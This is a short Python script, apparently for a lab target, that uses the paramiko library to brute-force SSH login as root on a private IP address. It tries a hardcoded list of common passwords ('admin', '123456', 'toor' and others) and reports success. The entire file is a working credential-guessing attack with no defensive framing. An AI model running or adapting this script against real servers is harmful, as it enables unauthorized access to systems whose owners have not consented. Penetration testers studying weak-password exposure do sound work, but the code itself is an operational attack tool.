import paramiko

target_ip = "192.168.223.152"
username = "root"

# Example password list
password_list = ["admin", "123456", "password", "root", "toor"]

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for password in password_list:
    try:
        print(f"[*] Trying {username}:{password}")
        ssh.connect(target_ip, username=username, password=password, timeout=3)
        print(f"[+] Success: {username}:{password}")
        break
    except paramiko.AuthenticationException:
        print("[!] Failed")
    except Exception as e:
        print(f"[!] Error: {e}")
